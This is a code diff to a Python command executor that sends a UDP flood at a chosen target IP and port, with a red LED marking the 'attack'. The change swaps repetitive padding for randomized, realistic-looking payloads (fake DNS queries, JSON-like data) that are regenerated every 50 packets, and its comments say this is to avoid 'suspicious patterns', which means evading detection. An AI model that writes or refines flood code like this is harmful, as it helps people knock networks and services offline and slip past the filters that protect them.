@@ -586,8 +586,35 @@ class CommandExecutor:
             self.gpio.stop_anim()
             self.gpio._off_all()
             
-            # Create payload of specified size
-            payload = b'A' * packet_size
+            # Create normal UDP payload - no padding, just realistic data
+            import random
+            import string
+            
+            # Generate normal-looking UDP data without suspicious patterns
+            if packet_size <= 32:
+                # Very small packets - minimal realistic data
+                payload = b'UDP' + str(random.randint(1000, 9999)).encode()
+            elif packet_size <= 128:
+                # Small packets - simulate DNS queries or similar
+                query_data = ''.join(random.choices(string.ascii_lowercase, k=min(packet_size-10, 20)))
+                payload = f"query:{query_data}".encode()
+            else:
+                # Larger packets - simulate normal application data
+                # Create realistic JSON-like or HTTP-like content
+                data_content = {
+                    'type': 'data_transfer',
+                    'seq': random.randint(1, 65535),
+                    'payload': ''.join(random.choices(string.ascii_letters + string.digits, k=min(packet_size-100, 200)))
+                }
+                payload = str(data_content).encode()
+            
+            # Trim to exact size if needed (no padding)
+            if len(payload) > packet_size:
+                payload = payload[:packet_size]
+            elif len(payload) < packet_size:
+                # If we need more data, add realistic content (not repetitive padding)
+                additional_data = ''.join(random.choices(string.ascii_letters + string.digits + ' .,', k=packet_size - len(payload)))
+                payload += additional_data.encode()
             
             # LED animation for flood start
             self.gpio._set(PIN_R, R_ACTIVE_LOW, True)  # Red LED for attack
@@ -615,9 +642,38 @@ class CommandExecutor:
                             break
                             
                         try:
-                            sock.sendto(payload, (target_ip, target_port))
+                            # Generate unique payload for each packet (no patterns)
+                            if self.flood_stats['packets_sent'] % 50 == 0:
+                                # Every 50th packet, generate completely new realistic data
+                                import random
+                                import string
+                                
+                                if packet_size <= 32:
+                                    current_payload = b'UDP' + str(random.randint(1000, 9999)).encode()
+                                elif packet_size <= 128:
+                                    query_data = ''.join(random.choices(string.ascii_lowercase, k=min(packet_size-10, 20)))
+                                    current_payload = f"query:{query_data}".encode()
+                                else:
+                                    data_content = {
+                                        'type': 'data_transfer',
+                                        'seq': random.randint(1, 65535),
+                                        'payload': ''.join(random.choices(string.ascii_letters + string.digits, k=min(packet_size-100, 200)))
+                                    }
+                                    current_payload = str(data_content).encode()
+                                
+                                # Adjust size without padding
+                                if len(current_payload) > packet_size:
+                                    current_payload = current_payload[:packet_size]
+                                elif len(current_payload) < packet_size:
+                                    additional_data = ''.join(random.choices(string.ascii_letters + string.digits + ' .,', k=packet_size - len(current_payload)))
+                                    current_payload += additional_data.encode()
+                                
+                                sock.sendto(current_payload, (target_ip, target_port))
+                            else:
+                                sock.sendto(payload, (target_ip, target_port))
+                                
                             self.flood_stats['packets_sent'] += 1
-                            self.flood_stats['bytes_sent'] += len(payload)
+                            self.flood_stats['bytes_sent'] += packet_size
                             
                             # Small delay to control bandwidth
                             if delay_between_packets > 0:
